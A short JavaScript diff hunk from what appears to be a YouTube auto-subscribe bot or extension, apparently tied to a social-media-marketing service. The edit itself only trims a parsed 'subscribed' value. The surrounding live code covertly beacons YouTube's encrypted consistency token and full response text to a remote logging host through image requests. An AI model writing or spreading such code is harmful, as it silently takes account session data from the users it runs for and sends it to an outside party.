@@ -461,7 +461,7 @@ function createPost(vars,type) {
 				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=yeniCok:'+parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents;
 				setCookie("CONSISTENCY",parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents,6)
 			}
-			let statusSubsribe = parsedText.split('"subscribed":')[1].split(',')[0];
+			let statusSubsribe = parsedText.split('"subscribed":')[1].split(',')[0].trim();
 			if(statusSubsribe == "false"){
 				new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek70';
 				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+parsedText;
